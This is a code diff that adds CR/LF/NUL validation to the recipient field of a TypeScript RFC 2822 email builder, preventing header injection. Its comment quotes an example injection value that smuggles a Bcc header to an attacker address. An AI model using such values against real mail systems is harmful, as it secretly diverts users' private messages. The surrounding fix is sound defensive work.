@@ -77,8 +77,21 @@ function base64url(input: string): string {
     .replace(/=+$/, '');
 }
 
+/** Reject CR/LF/NUL in a value that will be concatenated into an
+ *  RFC 2822 header line. Without this, a `to` like
+ *  `"victim@example.com\r\nBcc: attacker@evil.com"` would smuggle a
+ *  Bcc header into the encoded draft. Subject is base64-encoded so
+ *  it's safe by construction; only raw-concatenated fields need this. */
+export function isSafeHeaderValue(value: unknown): value is string {
+  if (typeof value !== 'string') return false;
+  return !/[\r\n\0]/.test(value);
+}
+
 /** Build an RFC 2822 message with UTF-8 encoded subject. */
 export function buildRfc2822(to: string, subject: string, body: string): string {
+  if (!isSafeHeaderValue(to)) {
+    throw new Error('to contains a CR/LF/NUL character');
+  }
   const utf8Subject = `=?UTF-8?B?${Buffer.from(subject, 'utf8').toString('base64')}?=`;
   return [
     `To: ${to}`,
